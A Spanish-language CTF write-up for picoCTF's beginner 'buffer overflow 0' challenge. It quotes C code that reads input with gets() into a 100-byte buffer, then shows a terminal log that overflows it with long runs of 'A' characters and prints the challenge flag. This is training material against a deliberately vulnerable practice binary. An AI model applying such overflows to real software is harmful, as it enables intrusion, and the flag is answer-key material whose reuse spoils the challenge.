# USERNAME -> amcdanymx

#### Description

Smash the stackLet's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/522/vuln). You can view source [here](https://artifacts.picoctf.net/c/522/vuln.c). And connect with it using:`nc saturn.picoctf.net 51110`
 

#### PISTAS

- How can you trigger the flag to print?
- If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.
- Run `man gets` and read the BUGS section. How many characters can the program really read?

#### SOLUCIÓN

Nos conectamos desde nc, nos dan un código en c que es el que ejecuta el programa, encontramos lo siguiente:
```
  printf("Input: ");

 fflush(stdout);

 char buf1[100];

 gets(buf1);

 vuln(buf1);

 printf("The program will exit now\n");

 return 0;

}**

```

Como vemos en el Buffer que es un arreglo solo caben 100 caracteres, lo hice a mano simplemente introuduciendo 100 letras 

```
amcdanymx:bufferoverflow0/ $ ls                                              
vuln  vuln.c

amcdanymx:bufferoverflow0/ $ nc saturn.picoctf.net 51110                    
Input: asdasdsd

The program will exit now

amcdanymx:bufferoverflow0/ $ code vuln.c                                          

amcdanymx:bufferoverflow0/ $ nc saturn.picoctf.net 51110                 
Input: Aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaasssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss

amcdanymx:bufferoverflow0/ $ nc saturn.picoctf.net 51110                                            [15:02:37]

Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

picoCTF{ov3rfl0ws_ar3nt_that_bad_8ba275ff}

**

```